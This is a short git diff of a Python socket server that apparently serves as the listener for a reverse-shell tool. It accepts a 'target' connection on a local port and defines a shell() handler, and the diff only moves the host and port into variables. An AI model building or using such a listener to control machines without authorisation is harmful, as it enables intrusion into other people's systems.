@@ -5,6 +5,11 @@ import json
 import signal
 import sys
 
+# Variables
+LHOST = "127.0.0.1"
+LPORT = 54321
+
+
 def c_signal(sig, frame):
 	print()
 	try:
@@ -36,7 +41,7 @@ def init_server():
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
 	# Bind socket
-	s.bind(("127.0.0.1", 54321))
+	s.bind((LHOST, LPORT))
 
 	# Number of connections
 	s.listen(1)
@@ -44,7 +49,6 @@ def init_server():
 
 	# Accept connection
 	target, ip = s.accept()
-
 	print("Target Connected!")
 
 def shell():
